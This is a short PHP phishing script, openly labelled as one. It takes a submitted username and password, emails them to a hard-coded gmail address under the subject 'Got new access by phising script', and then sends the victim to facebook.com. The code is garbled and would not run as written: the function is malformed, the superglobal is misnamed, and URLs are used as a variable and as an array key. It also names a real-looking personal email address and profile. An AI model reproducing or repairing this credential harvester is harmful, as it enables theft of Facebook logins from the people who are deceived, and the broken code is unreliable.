<?php
	mail_sender(){
		$username = $POST['https://www.facebook.ci'];
		$password = $POST['password'];
		
		$reciever = "vm2204@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $https://www.facebook.com/vm.mullai;
		$message .= "and password is ". $password;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
